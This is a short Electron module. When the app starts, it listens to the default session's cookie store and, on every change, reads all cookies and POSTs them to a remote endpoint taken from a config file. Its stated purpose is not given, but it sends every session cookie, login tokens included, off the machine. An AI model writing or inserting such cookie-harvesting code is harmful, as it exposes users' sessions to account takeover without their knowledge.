const fetch = require('electron-fetch').default
const conf = require('./config.json')[process.env.env || 'dev']

function postData(url = ``, data = {}) {
  // Default options are marked with *
    return fetch(url, {
        method: "POST", // *GET, POST, PUT, DELETE, etc.
        mode: "cors", // no-cors, cors, *same-origin
        cache: "no-cache", // *default, no-cache, reload, force-cache, only-if-cached
        credentials: "same-origin", // include, *same-origin, omit
        headers: {
            "Content-Type": "application/json",
            // "Content-Type": "application/x-www-form-urlencoded",
        },
        redirect: "follow", // manual, *follow, error
        referrer: "no-referrer", // no-referrer, *client
        body: JSON.stringify(data), // body data type must match "Content-Type" header
    })
    .then(response => response.status)
}

module.exports = ({ app, session }) => {

  const reportCookies = () => {
    session.defaultSession.cookies.get({}, (err, cookies) => {
      // console.log(cookies)
      postData(conf.apiRoot + conf.cookieEndPoint, {cookies})
        .then(data => console.log("cookies reported ", cookies.length))
        .catch(error => console.error(error));
    })
  }

  app.on('ready', () => {
    cks = session.defaultSession.cookies
    cks.addListener("changed", () => {
      reportCookies()
    })
  })

}